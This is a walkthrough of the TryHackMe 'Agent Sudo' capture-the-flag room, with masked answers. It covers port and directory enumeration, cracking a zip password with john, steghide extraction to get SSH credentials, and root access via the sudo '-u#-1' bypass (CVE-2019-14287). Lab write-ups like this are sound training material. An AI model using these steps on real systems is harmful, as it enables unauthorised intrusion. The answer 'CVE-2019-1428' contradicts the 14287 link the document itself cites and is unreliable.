

# Agent Sudo

room：https://tryhackme.com/room/agentsudoctf

### 1.Enumerate

1.nmap and gobuster

```
nmap -sC -sV(-sS -sV) MACHINE_IP
gobuster dir -u MACHINE_IP  -w /usr/share/wordlists/dirb/common.txt -t 50 
```

How many open ports?

```
3
```

How you redirect yourself to a secret page?

```
user-agent
```

![image-20221127152826263](https://user-images.githubusercontent.com/115979342/204271810-8f0f1119-68c4-41c0-95d4-79c83ca5e169.png)


What is the agent name?

```
chris
```



### 2.Hash cracking and brute-force

FTP password

<img width="912" alt="image-20221127152929563" src="https://user-images.githubusercontent.com/115979342/204272024-61acf8e8-2b2a-4b85-ab59-33d037bdbc44.png">

```
*
```

use ftp login to get file



![image-20221127152956848](https://user-images.githubusercontent.com/115979342/204272159-f0423d82-e7c0-441c-ac07-de4ca07ba186.png)


```bash
mget *
```

To_agentJ.txt useful message:

```bash
root@aoiri:~/tryhackme/agentsudo# cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

use binwalk

![image-20221127153116310](https://user-images.githubusercontent.com/115979342/204272329-19e40367-79c7-487a-b42f-d47c8f430b7b.png)

```
binwalk cutie.png -e
```

get the zip file and use zip2john crack the zip pasword:

```bash
zip2john 8702.zip > zip.hash
john zip.hash

```

![image-20221127153312804](https://user-images.githubusercontent.com/115979342/204272655-bf40f4ba-f49b-4699-9d90-3b351db44598.png)

Zip file password

```
*
```

steg password

txt file has the encrypted string "QXJlYTUx"

use magic in [CyberChef](https://gchq.github.io/CyberChef/)

![image-20221127153925077](https://user-images.githubusercontent.com/115979342/204272784-664dbc30-5233-437a-b0c4-6b7a0b99f6f4.png)

```
*
```

Who is the other agent (in full name)?

```bash
steghide extract -sf cute-alien.jpg 
```

![image-20221127155238827](https://user-images.githubusercontent.com/115979342/204272915-78b597d0-de7c-4163-8bb0-534cfadc5060.png)

```bash
root@aoiri:~/tryhackme/agentsudo/tmp# cat message.txt 
Hi james,

Glad you find this message. Your login password is ************

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
root@aoiri:~/tryhackme/agentsudo/tmp#
```

```
james
```

SSH password

```
************
```

use ssh login

### 3.Capture the user flag

just cat.

What is the user flag?

```
*
```

What is the incident of the photo called?

`sudo scp james@10.10.235.17:Alien_autospy.jpg ~/`

Reverse image and Foxnews.

```
Roswell alien autopsy
```



### 4.Privilege escalation


CVE number for the escalation  (Format: CVE-xxxx-xxxx)

use `sudo -l`

![image-20221128111736314](https://user-images.githubusercontent.com/115979342/204273027-50810959-1e0b-434d-9720-7ef5428b7efb.png)

use bash shell in gtfbins they are not working.

![image-20221128111812736](https://user-images.githubusercontent.com/115979342/204273141-18004205-0b89-40b6-80e2-7fa5cd1ce89c.png)

search on google about exploit

https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulner

find it's sudo1.8.27 exploit

```
CVE-2019-1428
```

What is the root flag?

https://www.exploit-db.com/exploits/47502

use this to Privilege escalation

```
sudo -u#-1 /bin/bash
```

cat flag:

```
*
```

(Bonus) Who is Agent R?

```
Des...
```





























